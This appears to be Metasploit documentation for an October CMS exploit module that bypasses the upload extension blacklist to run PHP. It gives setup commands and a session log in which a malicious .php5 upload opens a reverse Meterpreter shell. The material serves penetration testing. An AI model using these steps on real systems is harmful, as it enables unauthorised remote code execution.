{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/october_upload_bypass_exec","result":{"data":{"moduleMetadataJson":{"id":"a794d5be-c54e-570d-9820-b83e413461a8","name":"October CMS Upload Protection Bypass Code Execution","fullname":"exploit/multi/http/october_upload_bypass_exec","description":"This module exploits an Authenticated user with permission to upload and manage media contents can\n          upload various files on the server. Application prevents the user from\n          uploading PHP code by checking the file extension. It uses black-list based\n          approach, as seen in octobercms/vendor/october/rain/src/Filesystem/\n          Definitions.php:blockedExtensions().\n          This module was tested on October CMS version v1.0.412 on Ubuntu.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/october_upload_bypass_exec","documentationSlug":"/modules/documentation/exploit/multi/http/october_upload_bypass_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  An authenticated user with permission to upload and manage media contents can\nupload various files on the server. The application prevents the user from\nuploading PHP code by checking the file extension. It uses blacklist based\napproach, as seen in octobercms/vendor/october/rain/src/Filesystem/\nDefinitions.php:blockedExtensions().</p>\n<h2 id=\"vulnerable-software\" style=\"position:relative;\"><a href=\"#vulnerable-software\" aria-label=\"vulnerable software permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Software</h2>\n<p>  October CMS v1.0.412 (build 412)\n<a href=\"https://www.exploit-db.com/apps/4ff8a9688f31b7338020d0bc85da13fc-october-1.0.412.tar.gz\">https://www.exploit-db.com/apps/4ff8a9688f31b7338020d0bc85da13fc-october-1.0.412.tar.gz</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/october_upload_bypass_exec</code></li>\n<li>Do: `<code class=\"language-text\">set RHOSTS &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME &lt;user&gt;</code></li>\n<li>Do: <code class=\"language-text\">set PASSWORD &lt;pass&gt;</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"verification-steps-1\" style=\"position:relative;\"><a href=\"#verification-steps-1\" aria-label=\"verification steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/october_upload_bypass_exec\nmsf5 exploit(multi/http/october_upload_bypass_exec) &gt; set rhosts 10.10.10.16\nrhosts =&gt; 10.10.10.16\nmsf5 exploit(multi/http/october_upload_bypass_exec) &gt; setg verbose true\nverbose =&gt; true\nmsf5 exploit(multi/http/october_upload_bypass_exec) &gt; set lhost 10.10.14.8\nlhost =&gt; 10.10.14.8\nmsf5 exploit(multi/http/october_upload_bypass_exec) &gt; run \n\n[*] Started reverse TCP handler on 10.10.14.8:4444 \n[+] Token for login : 3ySsc8d8VNMm2V8x3Ns4cay05bwhRxnoIkQjRnBP\n[+] Session Key for login : uVNSZ2YRUm39cf8kqJcWV0qr9xhqq9krCYHeVI6m\n[*] Trying to Login ......\n[+] Authentication successful: admin:admin\n[*] Trying to upload malicious WLMVDKmVpCX.php5 file ....\n[*] Sending stage (38247 bytes) to 10.10.10.16\n[*] Meterpreter session 1 opened (10.10.14.8:4444 -&gt; 10.10.10.16:54124) at 2019-09-03 12:19:20 +0530\n[+] Deleted WLMVDKmVpCX.php5\n\nmeterpreter &gt; sysinfo \nComputer    : october\nOS          : Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686\nMeterpreter : php/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"a794d5be-c54e-570d-9820-b83e413461a8"}}}